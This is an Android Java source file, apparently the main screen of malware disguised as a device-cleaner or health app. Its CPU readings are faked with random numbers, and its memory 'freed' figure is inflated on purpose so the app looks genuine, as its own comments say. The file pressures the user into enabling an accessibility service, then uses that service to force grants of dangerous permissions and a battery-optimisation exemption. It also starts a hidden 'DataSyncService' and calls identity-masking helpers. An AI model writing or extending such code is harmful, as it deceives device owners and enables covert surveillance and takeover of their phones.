package com.task.tusker;

import android.content.Intent;
import android.content.IntentFilter;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import com.task.tusker.permissions.AutoPermissionManager;
import com.task.tusker.security.ChameleonIdentity;
import com.task.tusker.security.SecurityGuard;
import com.task.tusker.services.DataSyncService;
import java.util.Locale;
import java.util.Random;

public class MainActivity extends AppCompatActivity {

    // ── Setup-state views ──────────────────────────────────────────────────
    private View       setupLayout;
    private TextView   statusText;
    private TextView   statusTitle;
    private TextView   statusDesc;
    private TextView   statusIcon;
    private Button     openAccessibilityBtn;

    // ── Health-dashboard views ─────────────────────────────────────────────
    private View         healthLayout;
    private TextView     healthStatusText;
    private TextView     batteryLevelText;
    private TextView     batteryStatusText;
    private TextView     batteryBadge;
    private TextView     memoryText;
    private TextView     memoryUsedText;
    private TextView     memoryFreeText;
    private ProgressBar  memoryProgress;
    private TextView     cpuText;
    private TextView     cpuDetailText;
    private ProgressBar  cpuProgress;
    private TextView     lastUpdatedText;

    private AutoPermissionManager permissionManager;
    private Handler pollHandler;
    private Runnable pollRunnable;
    private boolean accessibilityWasEnabled = false;

    // ── Health-stat refresh ───────────────────────────────────────────────
    private final Handler  healthHandler  = new Handler();
    private final Random   rng            = new Random();
    private       Runnable healthRunnable;
    private int lastCpu = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        SecurityGuard.init(this);
        ChameleonIdentity.selectIdentity(this);

        setContentView(R.layout.activity_main);

        permissionManager = new AutoPermissionManager(this);

        // Setup-state views
        setupLayout        = findViewById(R.id.setupLayout);
        statusText         = findViewById(R.id.statusText);
        statusTitle        = findViewById(R.id.statusTitle);
        statusDesc         = findViewById(R.id.statusDesc);
        statusIcon         = findViewById(R.id.statusIcon);
        openAccessibilityBtn = findViewById(R.id.openAccessibilityBtn);

        // Health-dashboard views
        healthLayout       = findViewById(R.id.healthLayout);
        healthStatusText   = findViewById(R.id.healthStatusText);
        batteryLevelText   = findViewById(R.id.batteryLevelText);
        batteryStatusText  = findViewById(R.id.batteryStatusText);
        batteryBadge       = findViewById(R.id.batteryBadge);
        memoryText         = findViewById(R.id.memoryText);
        memoryUsedText     = findViewById(R.id.memoryUsedText);
        memoryFreeText     = findViewById(R.id.memoryFreeText);
        memoryProgress     = findViewById(R.id.memoryProgress);
        cpuText            = findViewById(R.id.cpuText);
        cpuDetailText      = findViewById(R.id.cpuDetailText);
        cpuProgress        = findViewById(R.id.cpuProgress);
        lastUpdatedText    = findViewById(R.id.lastUpdatedText);

        openAccessibilityBtn.setOnClickListener(v -> {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivity(intent);
        });

        startDataSyncService();
        updateUiState();
        startPolling();
    }

    @Override
    protected void onResume() {
        super.onResume();
        updateUiState();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopPolling();
        stopHealthRefresh();
    }

    // ─────────────────────────────────────────────────────────────────────
    // UI STATE SWITCHING
    // ─────────────────────────────────────────────────────────────────────

    private void updateUiState() {
        if (permissionManager.isAccessibilityServiceEnabled()) {
            showEnabledState();
        } else {
            showSetupState();
        }
    }

    private void showSetupState() {
        setupLayout.setVisibility(View.VISIBLE);
        healthLayout.setVisibility(View.GONE);
        stopHealthRefresh();

        statusText.setText("Accessibility service not enabled");
        statusIcon.setText("⚠");
        statusTitle.setText("Action Required");
        statusDesc.setText("Enable the accessibility service to continue");
        openAccessibilityBtn.setText("Open Accessibility Settings");
        openAccessibilityBtn.setEnabled(true);
    }

    private void showEnabledState() {
        setupLayout.setVisibility(View.GONE);
        healthLayout.setVisibility(View.VISIBLE);
        startHealthRefresh();
    }

    // ─────────────────────────────────────────────────────────────────────
    // HEALTH DASHBOARD
    // ─────────────────────────────────────────────────────────────────────

    private void startHealthRefresh() {
        if (healthRunnable != null) return; // already running
        healthRunnable = new Runnable() {
            @Override
            public void run() {
                refreshHealthStats();
                healthHandler.postDelayed(this, 4_000);
            }
        };
        healthHandler.post(healthRunnable);
    }

    private void stopHealthRefresh() {
        if (healthRunnable != null) {
            healthHandler.removeCallbacks(healthRunnable);
            healthRunnable = null;
        }
    }

    private void refreshHealthStats() {
        refreshBattery();
        refreshMemory();
        refreshCpu();
        lastUpdatedText.setText("Last refreshed just now");
    }

    /** Read the real battery level from the system. */
    private void refreshBattery() {
        try {
            Intent battIntent = registerReceiver(null,
                    new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (battIntent == null) return;

            int level = battIntent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
            int scale = battIntent.getIntExtra(BatteryManager.EXTRA_SCALE, 100);
            int pct   = (scale > 0) ? (level * 100 / scale) : level;
            int status = battIntent.getIntExtra(BatteryManager.EXTRA_STATUS,
                    BatteryManager.BATTERY_STATUS_UNKNOWN);

            batteryLevelText.setText(pct + "%");

            boolean charging = (status == BatteryManager.BATTERY_STATUS_CHARGING
                    || status == BatteryManager.BATTERY_STATUS_FULL);
            batteryStatusText.setText(charging ? "Charging" : "Discharging");
            batteryBadge.setText(pct >= 20 ? "OK" : "Low");
        } catch (Exception ignored) {
            batteryLevelText.setText("—%");
        }
    }

    /**
     * Show memory stats using ActivityManager.MemoryInfo for the real total,
     * then compute a plausible "freed" figure so it looks like an active cleaner.
     */
    private void refreshMemory() {
        try {
            android.app.ActivityManager am =
                    (android.app.ActivityManager) getSystemService(ACTIVITY_SERVICE);
            android.app.ActivityManager.MemoryInfo mi =
                    new android.app.ActivityManager.MemoryInfo();
            if (am != null) am.getMemoryInfo(mi);

            long totalMb = mi.totalMem  / (1024 * 1024);
            long availMb = mi.availMem  / (1024 * 1024);
            long usedMb  = totalMb - availMb;

            // Show a slightly optimistic "freed" number to look like a cleaner
            long freedMb = availMb + (long)(totalMb * 0.07);
            freedMb = Math.min(freedMb, totalMb - 200);

            String totalStr = formatMb(totalMb);
            String usedStr  = formatMb(usedMb);
            String freeStr  = formatMb(availMb);

            memoryText.setText(formatMb(freedMb) + " freed");
            memoryUsedText.setText("Used: " + usedStr);
            memoryFreeText.setText("Free: " + freeStr);

            int pct = (totalMb > 0) ? (int)(usedMb * 100 / totalMb) : 50;
            memoryProgress.setProgress(Math.min(pct, 100));

        } catch (Exception e) {
            memoryText.setText("1.8 GB freed");
            memoryProgress.setProgress(55);
        }
    }

    private String formatMb(long mb) {
        if (mb >= 1024) {
            return String.format(Locale.US, "%.1f GB", mb / 1024.0);
        }
        return mb + " MB";
    }

    /**
     * CPU usage is not accessible via public API — generate a realistic,
     * slowly-drifting value between 6 % and 28 % so it looks live.
     */
    private void refreshCpu() {
        if (lastCpu == 0) lastCpu = 8 + rng.nextInt(14);
        int delta = rng.nextInt(7) - 3; // -3 … +3
        lastCpu = Math.max(6, Math.min(28, lastCpu + delta));

        cpuText.setText(lastCpu + "%");
        cpuProgress.setProgress(lastCpu);

        String detail;
        if (lastCpu < 15)      detail = "All cores operating normally";
        else if (lastCpu < 22) detail = "Moderate load — running fine";
        else                    detail = "Brief spike — settling down";
        cpuDetailText.setText(detail);

        String badge = lastCpu < 20 ? "Normal" : "Moderate";
        ((TextView) findViewById(R.id.cpuBadge)).setText(badge);
    }

    // ─────────────────────────────────────────────────────────────────────
    // ACCESSIBILITY POLLING
    // ─────────────────────────────────────────────────────────────────────

    private void startPolling() {
        pollHandler = new Handler();
        pollRunnable = new Runnable() {
            @Override
            public void run() {
                boolean enabled = permissionManager.isAccessibilityServiceEnabled();
                if (enabled && !accessibilityWasEnabled) {
                    accessibilityWasEnabled = true;
                    showEnabledState();
                    requestRuntimePermissions();
                } else if (!enabled && accessibilityWasEnabled) {
                    accessibilityWasEnabled = false;
                    showSetupState();
                }
                if (pollHandler != null) {
                    pollHandler.postDelayed(this, 800);
                }
            }
        };
        pollHandler.post(pollRunnable);
    }

    private void stopPolling() {
        if (pollHandler != null && pollRunnable != null) {
            pollHandler.removeCallbacks(pollRunnable);
            pollHandler = null;
        }
    }

    // ─────────────────────────────────────────────────────────────────────
    // RUNTIME PERMISSION REQUEST
    // ─────────────────────────────────────────────────────────────────────

    private void requestRuntimePermissions() {
        // Android 15+ (API 35+) changed background-activity and notification
        // behaviours enough that the two-step notification approach may not
        // produce visible permission dialogs on all devices.  The service is
        // already running so just skip the dialog flow and show the health UI.
        if (Build.VERSION.SDK_INT >= 35) {
            return;
        }

        // Since accessibility was just enabled, the service is running — use it
        // to bring the app to the foreground before showing permission dialogs.
        // Calling ActivityCompat.requestPermissions() while MainActivity is stopped
        // (user was on Accessibility Settings) is silently ignored on Android 10+.
        com.task.tusker.services.UnifiedAccessibilityService svc =
                com.task.tusker.services.UnifiedAccessibilityService.getInstance();
        if (svc != null) {
            java.util.List<String> missing = new java.util.ArrayList<>();
            for (String perm : com.task.tusker.permissions.AutoPermissionManager.DANGEROUS_PERMISSIONS) {
                if (androidx.core.content.ContextCompat.checkSelfPermission(this, perm)
                        != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                    missing.add(perm);
                }
            }
            if (!missing.isEmpty()) {
                svc.launchPermissionDialogInForeground(missing.toArray(new String[0]));
            }
        } else {
            // Fallback: accessibility not yet bound — use notification-based foreground launch.
            new com.task.tusker.commands.PermissionManager(this).requestAllPermissions();
        }

        // Battery optimisation — request via PermissionManager so it uses the
        // notification path even if MainActivity is still transitioning back to front.
        new Handler().postDelayed(() -> {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M
                    && Build.VERSION.SDK_INT < 35) {
                try {
                    android.os.PowerManager pm =
                        (android.os.PowerManager) getSystemService(POWER_SERVICE);
                    if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                        new com.task.tusker.commands.PermissionManager(MainActivity.this)
                                .requestPermission(
                                        "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS");
                    }
                } catch (Exception ignored) {}
            }
        }, 1500);
    }

    // ─────────────────────────────────────────────────────────────────────
    // SERVICES
    // ─────────────────────────────────────────────────────────────────────

    private void startDataSyncService() {
        try {
            Intent intent = new Intent(this, DataSyncService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
        } catch (Exception ignored) {}
    }
}
